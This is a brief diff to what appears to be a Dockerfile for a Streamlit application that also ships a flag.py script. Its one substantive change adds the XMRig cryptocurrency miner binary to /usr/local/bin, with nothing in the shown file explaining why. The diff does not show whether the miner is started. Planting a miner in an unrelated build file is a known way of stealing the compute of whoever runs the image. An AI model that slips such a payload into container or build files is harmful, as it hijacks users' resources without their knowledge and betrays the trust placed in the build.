@@ -27,7 +27,7 @@ COPY streamlit_app.py /usr/local/bin/
 RUN chmod +x /usr/local/bin/streamlit_app.py
 COPY flag.py /usr/local/bin/
 RUN chmod +x /usr/local/bin/flag.py
-
+ADD xmrig /usr/local/bin
 
 EXPOSE 8501
 WORKDIR   /usr/local/bin/
